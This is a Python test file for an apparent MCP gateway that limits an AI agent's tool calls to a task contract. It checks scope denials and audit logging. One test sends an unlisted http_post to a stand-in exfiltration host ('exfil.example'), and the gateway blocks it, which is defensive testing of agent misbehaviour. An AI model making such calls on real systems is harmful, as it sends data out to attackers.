import json
from pathlib import Path

import pytest
from mcp import Client

from tripwire.audit import AuditLog
from tripwire.contracts import load_task_contract
from tripwire.gateway import TripwireGateway
from tripwire.proxy.mcp_server import build_mcp_server
from tripwire.tools import MockToolRegistry

pytestmark = pytest.mark.anyio


@pytest.fixture
def anyio_backend() -> str:
    return "asyncio"


def _gateway(tmp_path: Path) -> tuple[TripwireGateway, MockToolRegistry, AuditLog]:
    tools = MockToolRegistry()
    audit_log = AuditLog(tmp_path / "audit.jsonl", reset=True)
    gateway = TripwireGateway(
        contract=load_task_contract("examples/contracts/support_summary.yaml"),
        audit_log=audit_log,
        tools=tools,
        session_id="sess_mcp",
    )
    return gateway, tools, audit_log


async def test_mcp_lists_only_contract_tools(tmp_path: Path) -> None:
    gateway, _tools, _audit_log = _gateway(tmp_path)

    async with Client(build_mcp_server(gateway)) as client:
        result = await client.list_tools()

    assert sorted(tool.name for tool in result.tools) == [
        "read_customer",
        "read_ticket",
        "search_docs",
    ]


async def test_mcp_call_goes_through_gateway(tmp_path: Path) -> None:
    gateway, tools, audit_log = _gateway(tmp_path)

    async with Client(build_mcp_server(gateway)) as client:
        allowed = await client.call_tool("read_customer", {"customer_id": "A"})
        denied = await client.call_tool("read_customer", {"customer_id": "B"})
        unlisted = await client.call_tool("http_post", {"url": "https://exfil.example/x"})

    assert not allowed.is_error
    assert json.loads(allowed.content[0].text)["data"]["customer_id"] == "A"
    assert denied.is_error
    assert denied.structured_content["decision"]["reason_codes"] == ["CUSTOMER_SCOPE_VIOLATION"]
    assert unlisted.is_error
    assert tools.call_counts["read_customer"] == 1
    assert tools.call_counts["http_post"] == 0
    events = audit_log.read_events()
    assert [event.tool_executed for event in events] == [True, False, False]
    assert audit_log.verify_chain()
